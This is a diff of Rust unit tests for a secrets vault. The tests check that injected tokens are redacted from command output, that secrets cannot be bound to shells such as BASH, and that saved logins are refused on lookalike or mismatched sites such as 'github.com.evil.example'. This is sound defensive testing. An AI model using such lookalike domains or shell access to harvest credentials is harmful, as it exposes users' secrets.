+        };
+        let dir = tempfile::tempdir().unwrap();
+        let program = crate::harness::resolve_gui_binary("printenv").unwrap();
+        let finished = run::run(&program, &running.template, &running.env, dir.path());
+        let report = run_finish(&mut loaded, running, finished).unwrap().to_string();
+        assert!(!report.contains("FAKE-gh-token-123"), "{report}");
+        assert!(report.contains(REDACTED), "{report}");
+        let used = loaded.vault.audit_list(10).unwrap();
+        assert!(used
+            .iter()
+            .any(|e| e.outcome == "used" && e.action == "secrets.run" && e.host == "printenv" && e.detail == "exit 0"));
+        assert!(used.iter().any(|e| e.outcome == "blocked" && e.host == "gh"));
+        // Shells and interpreters cannot be named at all.
+        assert!(save_core(
+            &mut loaded,
+            serde_json::from_value(json!({"persistent": true, "name": "X_KEY", "commands": ["BASH"], "value": "abcdef"}))
+                .unwrap(),
+            1,
+        )
+        .is_err());
+    }
+
+    #[test]
+    fn logins_fill_only_on_their_sites_and_only_logins() {
+        let mut loaded = loaded();
+        save(
+            &mut loaded,
+            json!({"persistent": true, "name": "GITHUB_LOGIN", "kind": "login", "username": "wegvon",
+                   "hosts": ["github.com"], "value": "FAKE-password-1"}),
+        );
+        save(
+            &mut loaded,
+            json!({"persistent": true, "name": "API_KEY", "hosts": ["github.com"], "value": "FAKE-key-1234"}),
+        );
+        let site = |url: &str| page_target(url).unwrap();
+        let Checked::Ready(ok) =
+            login_prepare(&mut loaded, "chat-1", "GITHUB_LOGIN", &site("https://github.com/login"), None, 2_000)
+                .unwrap()
+        else {
+            panic!("a free login needs no approval")
+        };
+        assert_eq!((ok.meta.username.as_str(), ok.password.as_str()), ("wegvon", "FAKE-password-1"));
+        for (name, url) in [
+            ("GITHUB_LOGIN", "https://github.com.evil.example/login"),
+            ("GITHUB_LOGIN", "https://gist.github.com/"),
+            ("GITHUB_LOGIN", "https://github.com:8443/login"),
+            ("API_KEY", "https://github.com/login"),
+        ] {
+            let error = login_prepare(&mut loaded, "chat-1", name, &site(url), None, 2_000).err().unwrap();
+            assert!(error.starts_with("Blocked"), "{url}: {error}");
+            assert!(!error.contains("FAKE"), "{error}");
+        }
+        assert!(page_target("http://github.com/login").is_err());
+        assert!(login_prepare(&mut loaded, "chat-1", "MISSING", &site("https://github.com/"), None, 2_000).is_err());
     }
 }
